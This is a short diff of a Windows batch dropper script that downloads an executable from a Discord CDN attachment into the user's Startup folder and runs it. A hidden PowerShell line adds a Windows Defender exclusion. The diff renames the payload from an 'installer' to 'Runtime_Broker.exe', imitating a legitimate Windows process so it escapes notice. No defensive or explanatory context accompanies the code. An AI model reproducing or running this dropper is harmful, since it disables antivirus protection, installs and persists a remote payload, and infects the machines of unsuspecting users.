@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214616960000860220/RessificeOnlineInstallerx64.exe?ex=65f9c331&is=65e74e31&hm=5acfd537be9942c76ac50f55c44b1f1bbee24bf326c0e57c403b8cab16501e82&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RessificeOnlineInstallerx64.exe"
+set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214629451074371675/Runtime_Broker.exe?ex=65f9ced3&is=65e759d3&hm=91279ff95eb93df6db7e9ccbfdf69cfb8c257971f0172b319d5f32a2cec94a9b&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Runtime_Broker.exe"
 
 
 if exist "%DEST%" del "%DEST%"
@@ -20,8 +20,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214616960000860220/RessificeOnlineInstallerx64.exe?ex=65f9c331&is=65e74e31&hm=5acfd537be9942c76ac50f55c44b1f1bbee24bf326c0e57c403b8cab16501e82&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RessificeOnlineInstallerx64.exe"
+set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214629451074371675/Runtime_Broker.exe?ex=65f9ced3&is=65e759d3&hm=91279ff95eb93df6db7e9ccbfdf69cfb8c257971f0172b319d5f32a2cec94a9b&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Runtime_Broker.exe"
 
 
 if exist "%DEST%" del "%DEST%"
